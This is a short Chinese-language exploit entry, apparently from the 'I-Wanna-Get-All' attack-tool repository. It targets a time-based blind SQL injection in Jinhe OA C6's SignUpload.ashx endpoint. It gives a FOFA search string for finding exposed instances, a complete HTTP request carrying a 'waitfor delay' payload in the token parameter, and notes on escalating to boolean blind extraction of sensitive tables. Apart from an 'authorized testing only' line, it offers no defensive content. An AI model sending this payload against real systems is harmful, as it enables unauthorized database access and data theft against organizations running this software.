---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 金和OA SignUpload.ashx SQL注入漏洞

## 漏洞描述

金和OA C6 `/C6/Jhsoft.Web.ask/SignUpload.ashx` 接口 `token` 参数存在 SQL 注入漏洞（延时盲注），`filename` 参数可一并利用。

## 影响版本

```
金和OA C6
```

## 网络测绘

```
app="金和OA"
```

## 漏洞复现

```
GET /C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3Bwaitfor/**/+delay/**/+%270%3A0%3A3%27+--%20and%201=1_123_123&filename=1 HTTP/1.1
```

延时 3 秒响应即确认注入，可转为布尔盲注读取敏感表。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
